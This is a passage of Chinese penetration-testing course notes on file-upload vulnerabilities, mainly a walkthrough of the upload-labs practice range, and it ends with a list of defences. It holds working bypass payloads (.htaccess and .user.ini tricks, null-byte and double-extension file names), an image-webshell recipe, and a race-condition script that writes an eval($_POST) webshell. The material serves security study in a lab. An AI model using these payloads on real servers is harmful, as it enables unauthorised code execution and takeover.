href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Disposit">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Disposit</a></p><h2 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h2><ol><li>png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。 即为 .PNG。</li><li>jpg图片文件包括2字节：FF D8。 </li><li>gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。 </li><li>bmp图片文件包括2字节：42 4D。即为 BM。 </li><li>.class文件的文件头：ca fe ba be</li></ol><h1 id="文件上传漏洞发现与利用"><a href="#文件上传漏洞发现与利用" class="headerlink" title="文件上传漏洞发现与利用"></a>文件上传漏洞发现与利用</h1><h2 id="文件上传漏洞利用流程"><a href="#文件上传漏洞利用流程" class="headerlink" title="文件上传漏洞利用流程"></a>文件上传漏洞利用流程</h2><ol><li><p>找到上传的位置 </p><p>Redis KV 持久化+未授权访问的漏洞</p><p>MySQL 读写 select into file…</p><p>CMS 小马，shell.php</p></li><li><p>尝试绕过校验，上传文件 </p></li><li><p>获得文件位置 </p><p>监视文件位置变化工具</p></li><li><p>蚁剑连接，管理文件</p><p>要有执行权限</p></li></ol><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><ul><li><strong>删除/禁用JS</strong></li><li><strong>修改MIME</strong></li><li><strong>等价扩展名</strong></li><li><strong>大小写</strong></li><li><strong>htaccess</strong></li><li><strong>双写</strong></li><li><strong>空格</strong></li><li><strong>点</strong></li><li><strong>::$DATA</strong></li><li><strong>%00截断</strong></li><li><strong>0x00截断</strong></li><li><strong>图片马</strong></li><li><strong>条件竞争</strong></li></ul><h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><p>自动扫描一个项目有没有文件上传的漏洞</p><p><a href="https://github.com/almandin/fuxploider">https://github.com/almandin/fuxploider</a></p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/almandin/fuxploider.gitcd fuxploiderpip3 install -r requirements.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>windows:</p><pre class="line-numbers language-none"><code class="language-none">python3 -m pip install -r requirements.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Docker:</p><pre class="line-numbers language-none"><code class="language-none"># Build the docker imagedocker build -t almandin/fuxploider<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获得基本选项和开关的列表:</p><pre class="line-numbers language-none"><code class="language-none">python3 fuxploider.py -h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">python3 fuxploider.py --url http://192.168.31.193:7298/Pass-02/index.php --not-regex "wrong file type"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="文件上传漏洞防御"><a href="#文件上传漏洞防御" class="headerlink" title="文件上传漏洞防御"></a>文件上传漏洞防御</h1><h2 id="文件上传漏洞发生的前提"><a href="#文件上传漏洞发生的前提" class="headerlink" title="文件上传漏洞发生的前提"></a>文件上传漏洞发生的前提</h2><ol><li>网站上传功能能正常使用 </li><li>文件类型允许上传 </li><li>上传路径可以确定 </li><li>文件可以被访问，可以<strong>被执行</strong>或被包含</li></ol><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul><li><strong>扩展名（后缀）黑白名单</strong> </li><li><strong>MIME类型校验（image/gif）</strong> </li><li><strong>文件内容头校验（GIF89a）</strong></li><li><strong>对文件内容进行二次渲染</strong> </li><li><strong>对上传的文件重命名，不易被猜测</strong> </li><li><strong>不要暴露上传文件的位置</strong> </li><li><strong>禁用上传文件的执行权限</strong></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/13-wen-jian-shang-chuan/upload-labs/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/13-wen-jian-shang-chuan/upload-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传靶场安装"><a href="#文件上传靶场安装" class="headerlink" title="文件上传靶场安装"></a>文件上传靶场安装</h1><p><a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><h1 id="打开靶场"><a href="#打开靶场" class="headerlink" title="打开靶场"></a>打开靶场</h1><p><a href="http://192.168.31.193:7298/">http://192.168.31.193:7298/</a></p><h1 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token operator">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span>value<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用javascript验证文件后缀，禁用掉浏览器js,完成上传。</p><h2 id="JS前端验证"><a href="#JS前端验证" class="headerlink" title="JS前端验证"></a><strong>JS前端验证</strong></h2><p>漏洞描述：利用前端 JS 对上传文件后缀进行校验，后端没进行检测 </p><p>利用方法：</p><ol><li><p>浏览器<strong>禁用 js</strong></p></li><li><p>使用浏览器的开发者工具<strong>删掉提交时调用js的函数</strong>。</p></li><li><p>burp抓包 先上传白名单文件，再用 burp在<strong>Content-Type</strong> <strong>修改上传<em>文件后缀</em></strong></p></li></ol><h1 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>判断文件类型，设置<strong>白名单</strong>，只允许<strong>image/jpeg</strong>，<strong>image/png</strong>，<strong>image/gif</strong>类型的图片上传。</p><p>burpsuite抓包，修改要上传文件的<strong>Content-Type</strong>类型为这里指定的文件类型。</p><p><img src="/assets/image-20221122163416253.png" alt="image-20221122163416253"></p><p>将content-type修改为image/png，</p><p><img src="/assets/image-20221122163451618.png" alt="image-20221122163451618"></p><p>文件上传成功。</p><h1 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.asp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.aspx'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对扩展后缀使用<strong>黑名单</strong>，但是不全，尝试使用<strong>等价扩展名</strong></p><p>例如，传的文件是php，那么它的等价扩展名为php3，php4等等</p><p><img src="/assets/image-20221122164841666.png" alt="image-20221122164841666"></p><p>同样将content-type修改为image/png，</p><p><img src="/assets/image-20221122164910783.png" alt="image-20221122164910783"></p><p>上传成功。将图片在新标签也打开，发现<strong>图片被重命名</strong>了。</p><p><img src="/assets/image-20221122205041349.png" alt="image-20221122205041349"></p><p>将图片右键在新标签页打开</p><p><img src="/assets/image-20221122205456474.png" alt="image-20221122205456474"></p><p><a href="http://192.168.31.193:7298/upload/202211222050584341.php3">http://192.168.31.193:7298/upload/202211222050584341.php3</a></p><p>使用蚁剑连接</p><p><img src="/assets/image-20221122211217281.png" alt="image-20221122211217281"></p><p>连接成功</p><h1 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h1><pre class="line-numbers language-none"><code class="language-none">if (file_exists(UPLOAD_PATH)) {       $deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>黑名单十分丰富，使用**.htaccess**改变文件扩展名。</p><p><strong>上传.htaccess 解析文件</strong>，利用其配置，将白名单文件的类型解析成 php 文件类型。</p><p>将服务器上的 1.jpg 文件解析成 php 文件.</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;FilesMatch "1.jpg"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>再上传一个一句话木马</strong>，文件名为 1.jpg，依旧访问 1.jpg，但其会以 php 形式显示</p><p><img src="/assets/image-20221122211439276.png" alt="image-20221122211439276"></p><p>连接成功</p><h1 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h1><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");$file_ext = strtolower($file_ext); //转换为小写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将.htaccess也禁用掉了</p><p>利用**.user.ini** 配置文件，</p><p>.user.ini 相当于一个用 户自定义的 php.ini</p><p>上传文件 <strong>.user.ini</strong></p><p>内容为： </p><p><code>auto_prepend_file=2.jpg</code> </p><p>再上传一个内容为 php 一句话脚本，命名为 2.jpg。</p><p>.user.ini 文件作用：</p><p>所有的 php 文件都自动包含 2.jpg 文件。</p><h1 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h1><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>黑名单新增.ini配置文件，</p><p>但是这关没有使用<strong>strtolower()<strong>函数对</strong>大小写</strong>进行限制。</p><p>将文件名改成大写：<strong>1.PHP</strong></p><p>上传文件后，文件被重命名为<strong>202211221856456857.PHP</strong></p><p><a href="http://192.168.31.193:7298/upload/202211222050584341.php3">http://192.168.31.193:7298/upload/202211222050584341.php3</a></p><p>使用蚁剑连接，连接成功</p><h1 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h1><p>访问<a href="http://192.168.31.193:8089/Pass-07/index.php">http://192.168.31.193:8089/Pass-07/index.php</a></p><pre class="line-numbers language-none"><code class="language-none">$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, '.');$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>本关没有<strong>trim()<strong>函数，首尾去</strong>空格</strong></p><p>因为windows不能在扩展名添空格，会被删除；只能bripsuite抓包在后缀名后添加空格：<strong>1.php</strong> （使用php5.3.29版本复现的）</p><p><img src="/assets/image-20221122215554928.png" alt="image-20221122215554928"></p><p>上传成功,连接**202211230600234539.php **</p><p><img src="/assets/image-20221122220048550.png" alt="image-20221122220048550"></p><p><img src="/assets/image-20221122220205776.png" alt="image-20221122220205776"></p><p>文件上传成功，后缀名后的空格消失，成功上传了php文件。</p><h1 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h1><p>访问<a href="http://192.168.31.193:8089/Pass-08/index.php">http://192.168.31.193:8089/Pass-08/index.php</a></p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">$file_ext = strrchr($file_name, '.');$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>本关<strong>deldot()函数</strong>没有<strong>删除文件名末尾去点</strong></p><p>抓包在php后缀名后加一个点绕过：<strong>1.php.</strong></p><p><img src="/assets/image-20221123101058484.png" alt="image-20221123101058484"></p><p><img src="/assets/image-20221123101957020.png" alt="image-20221123101957020"></p><p>上传成功，网页空白，被当作代码执行了。</p><p><img src="/assets/image-20221123102159777.png" alt="image-20221123102159777"></p><p>上传成功的文件，后面的点也被自动删除。</p><h1 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h1><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, '.');$file_ext = strtolower($file_ext); //转换为小写$file_ext = trim($file_ext); //首尾去空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这一关没有<strong>str_ireplace()<strong>函数</strong>去除字符串::$DATA</strong></p><p>没有这个限制，就添加这个<code>::$DATA</code>字符串上去</p><p><code>1.php::$DATA</code></p><p><img src="/assets/image-20221123103656056.png" alt="image-20221123103656056"></p><p><img src="/assets/image-20221123104003841.png" alt="image-20221123104003841"></p><p>上传成功后，发现无法访问，可能后缀后的字符串在上传成功后被删除了；</p><p>删除后面的<code>::$DATA</code>，再次访问，</p><p><img src="/assets/image-20221123104204581.png" alt="image-20221123104204581"></p><p>成功访问，也被当做代码被执行。</p><h1 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h1><pre class="line-numbers language-none"><code class="language-none">$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, '.');$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这关没有缺什么函数，尝试其他思路</p><p>代码顺序是先删除一个点和在删除一个空格，那尝试多添加一个点：<strong>点，空格，点</strong>这样后缀名后会剩一个点，然后就绕过黑名单。</p><p><code>1.php. .</code></p><p><img src="/assets/image-20221123105324928.png" alt="image-20221123105324928"></p><h1 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h1><pre class="line-numbers language-none"><code class="language-none">$file_name = str_ireplace($deny_ext,"", $file_name);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本关没有之前的处理函数，但是增加了<strong>str_ireplace()<strong>函数：若匹配上了黑名单的后缀名，则直接</strong>删除后缀名</strong>，替换为空。</p><p>尝试<strong>双写</strong>后缀名<code>1.pphphp</code></p><p><img src="/assets/image-20221123110603709.png" alt="image-20221123110603709"></p><p><img src="/assets/image-20221123110637203.png" alt="image-20221123110637203"></p><p>上传成功</p><h1 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h1><pre class="line-numbers language-none"><code class="language-none">$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用<strong>save_path</strong>路径保存</p><p>抓包查看是什么样子的</p><p><img src="/assets/image-20221123140759549.png" alt="image-20221123140759549"></p><p>保存在upload目录下，使用<strong>文件名截断</strong>%00，控制读取的路径。</p><p><strong>get型00截断</strong>：<code>1.php%00</code></p><p><img src="/assets/image-20221123141407395.png" alt="image-20221123141407395"></p><p>图片改为1.jpg</p><p><img src="/assets/image-20221123141432715.png" alt="image-20221123141432715"></p><h1 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h1><pre class="line-numbers language-none"><code class="language-none">$img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>post型00截断</strong>，需要在 <strong>16 进制中修改</strong>，因为 POST 不会像 GET 那 样对%00 进行自动解码。</p><p><img src="/assets/image-20221123144043894.png" alt="image-20221123144043894"></p><p><img src="/assets/image-20221123144302559.png" alt="image-20221123144302559"></p><h1 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h1><p><img src="/assets/image-20221123152221141.png" alt="image-20221123152221141"></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getReailFileType</span><span class="token punctuation">(</span><span class="token parameter">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>$filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    $bin <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>$file<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//只读2字节</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>getReailFileType()<strong>函数</strong>读取文件头</strong>前两个字节。判断文件类型，利用<strong>图片马</strong>绕过检查</p><h2 id="图片马制作"><a href="#图片马制作" class="headerlink" title="图片马制作"></a>图片马制作</h2><p>在 cmd 里执行 <code>copy 1.gif/b+1.PHP/a 2.gif</code> </p><ul><li>1.jpg 为任意图片 </li><li>1.php 为我们要插入的木马代码 </li><li>2.jpg 为我们要创建的图片马 </li><li><img src="/assets/image-20221123150533056.png" alt="image-20221123150533056"></li></ul><p>使用文件包含漏洞，</p><p><img src="/assets/image-20221123152238096.png" alt="image-20221123152238096"></p><p><a href="http://192.168.31.193:8089/include.php?file=upload/5920221123150637.gif">http://192.168.31.193:8089/include.php?file=upload/5920221123150637.gif</a></p><h1 id="pass15"><a href="#pass15" class="headerlink" title="pass15"></a>pass15</h1><pre class="line-numbers language-none"><code class="language-none">$info = getimagesize($filename);$ext = image_type_to_extension($info[2]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>getimagesize()<strong>函数</strong>获取图片大小</strong>，由此来判断是不是一个有效的图片。</p><p>依旧上传上一个的图片码，利用提供的文件包含漏洞接口，连接蚁剑。</p><h1 id="pass16"><a href="#pass16" class="headerlink" title="pass16"></a>pass16</h1><pre class="line-numbers language-none"><code class="language-none">//需要开启php_exif模块$image_type = exif_imagetype($filename);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>exif_imagetype()<strong>函数自动读取</strong>图片的第一个字节并检查其签名</strong>，来判断文件类型。</p><p>同样上传图片码</p><h1 id="pass17"><a href="#pass17" class="headerlink" title="pass17"></a>pass17</h1><pre class="line-numbers language-none"><code class="language-none">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径   $filename = $_FILES['upload_file']['name'];   $filetype = $_FILES['upload_file']['type'];   $tmpname = $_FILES['upload_file']['tmp_name'];   $target_path=UPLOAD_PATH.'/'.basename($filename);   // 获得上传文件的扩展名   $fileext= substr(strrchr($filename,"."),1);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这关会获取文件扩展名。综合判断了后缀名、content-type，</p><p>以及利用 <strong>imagecreatefromgif</strong> 判断是否为 gif 图片，并在最后对文件内容进行了<strong>二次渲染</strong>，修改文件内容 </p><p>上传一个 GIF 图片马，然后将其下载下来，</p><p>查看其十六进制的文件内容， 找到二次渲染后不变的地方，</p><p>而这个地方就是可以插入一句话的地方</p><h1 id="pass18"><a href="#pass18" class="headerlink" title="pass18"></a>pass18</h1><pre class="line-numbers language-none"><code class="language-none">if(isset($_POST['submit'])){    $ext_arr = array('jpg','png','gif');    $file_name = $_FILES['upload_file']['name'];    $temp_file = $_FILES['upload_file']['tmp_name'];    $file_ext = substr($file_name,strrpos($file_name,".")+1);    $upload_file = UPLOAD_PATH . '/' . $file_name;    if(move_uploaded_file($temp_file, $upload_file)){        if(in_array($file_ext,$ext_arr)){             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        }else{            $msg = "只允许上传.jpg|.png|.gif类型文件！";            unlink($upload_file);        }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会将图片路径移动，并且删除上传的文件。</p><p>但是判断到删除有时间差，在php文件还没有被删除，然后<strong>再产生新的php文件</strong>。</p><p>条件竞争:利用代码执行的时间差，产生新的文件。</p><p>上传competition.php文件，</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span> wuya<span class="token operator">.</span>php<span class="token string single-quoted-string">' , '</span>w <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[ "wuya"])?&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>burpsuite抓包使用intruder模块<strong>不断发包上传</strong>php文件。</p><p><img src="/assets/image-20221123163555707.png" alt="image-20221123163555707"></p><p>同样使用burpsuite抓包<strong>不断访问</strong><a href="http://192.168.31.193:7298/upload/competition.php%EF%BC%8C%E8%A7%A6%E5%8F%91php%E6%96%87%E4%BB%B6%EF%BC%8C**%E4%BA%A7%E7%94%9F%E6%96%B0%E7%9A%84php%E6%96%87%E4%BB%B6**%E3%80%82">http://192.168.31.193:7298/upload/competition.php，触发php文件，**产生新的php文件**。</a></p><p><img src="/assets/image-20221123165255899.png" alt="image-20221123165255899"></p><p>连接成功</p><h1 id="pass19"><a href="#pass19" class="headerlink" title="pass19"></a>pass19</h1><pre class="line-numbers language-none"><code class="language-none">require_once("./myupload.php");$imgFileName =time();var $cls_arr_ext_accepted = array(".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",".html", ".xml", ".tiff", ".jpeg", ".png" );switch ($status_code) {        case 1:            $is_upload = true;            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;            break;        case 2:            $msg = '文件已经被上传，但没有重命名。';            break;         case -1:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用白名单，如果文件上传的过快，<strong>还没来得及重命名</strong>，文件名将被保留</p><p><code>1.php.7z</code></p><p>Apache2.4 的<strong>解析漏洞</strong>会将<code>.php.*</code>当中php代码执行</p><h1 id="pass20"><a href="#pass20" class="headerlink" title="pass20"></a>pass20</h1><pre class="line-numbers language-none"><code class="language-none">$deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");        $file_name = $_POST['save_name'];        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);        if(!in_array($file_ext,$deny_ext)) {            $temp_file = $_FILES['upload_file']['tmp_name'];            $img_path = UPLOAD_PATH . '/' .$file_name;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用黑名单，逻辑漏洞，使用 <strong>pathinfo()函数</strong>从<strong>最后一个小数点进行截取</strong>方式检查文件名后缀</p><p>在文件名后缀加一个小数点绕过 <code>1.php.</code>，</p><p>上传成功可以直接访问 1.php</p><h1 id="pass21"><a href="#pass21" class="headerlink" title="pass21"></a>pass21</h1><pre class="line-numbers language-none"><code class="language-none">if(!in_array($_FILES['upload_file']['type'],$allow_type)){        $msg = "禁止上传该类型文件!";    }else{        //检查文件名        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];        if (!is_array($file)) {            $file = explode('.', strtolower($file));        }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对参数$file 进行判断，如果不是，将其修改为<strong>数组</strong></p><p><strong>提前传入数组</strong>时，造成漏洞</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/12csrf/csrf-lou-dong/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/12csrf/csrf-lou-dong/</url>
      
